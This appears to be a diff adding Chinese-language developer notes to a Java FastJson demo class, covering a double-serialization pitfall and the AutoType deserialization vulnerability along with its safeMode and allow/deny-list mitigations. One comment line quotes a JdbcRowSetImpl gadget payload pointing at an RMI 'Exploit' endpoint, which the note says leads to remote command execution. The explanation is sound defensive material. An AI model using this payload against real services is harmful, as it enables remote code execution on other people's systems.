@@ -9,9 +9,17 @@ import java.util.Objects;
 
 /**
  * 阿里巴巴FastJson
- * tips:
- *  1.一个json格式的数据已经转换成字符串形式，后续又对其进行了转换操作，导致后续反转换一次后无法解析成json格式数据。
+ * ●.一个json格式的数据已经转换成字符串形式，后续又对其进行了转换操作，导致后续反转换一次后无法解析成json格式数据。
  *      JSON.toJSONString()对String数据操作后得到的数据会在收尾增加字符串符号 " ，需要留意。
+ * ●.AutoType引发的反序列化漏洞。
+ *     AutoType是fastJson用来在序列化的时候记录转换的类的类型的，解决了反序列化时无法区分子类和父类、接口和实现类的情况。
+ *         AutoType会序列化后的字符串中增加一个 "@type" 字段来记录对象的类型方便在反序列化的时候定位到具体的类型。
+ *     该特性会导致反序列攻击，例如 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
+ *         会利用该特性生成一个JdbcRowSetImpl触发远程命令执行。
+ *     官方的解决方案为：
+ *         1.通过黑名单和白名单来约束。
+ *         2.版本1.2.68提供了safeMode ，配置safeMode后，无论白名单和黑名单，都不支持autoType，可一定程度上缓解反序列化Gadgets类变种攻击。
+ *             ParserConfig.getGlobalInstance().setSafeMode(true);
  * @author rone
  */
 public class FastJsonDemo {
